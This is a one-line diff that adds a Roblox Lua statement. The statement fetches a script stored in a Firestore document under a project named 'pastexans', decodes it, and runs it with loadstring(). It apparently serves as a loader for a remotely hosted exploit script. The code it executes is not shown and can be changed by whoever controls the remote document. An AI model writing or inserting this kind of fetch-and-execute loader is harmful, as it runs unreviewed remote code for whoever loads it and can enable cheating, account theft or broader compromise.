@@ -1,0 +1,1 @@
+loadstring(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://firestore.googleapis.com/v1/projects/pastexans/databases/(default)/documents/artifacts/sharexans-v2/public/data/scripts/NRD0aRZOmHgKXIE45608")).fields.content.stringValue)()
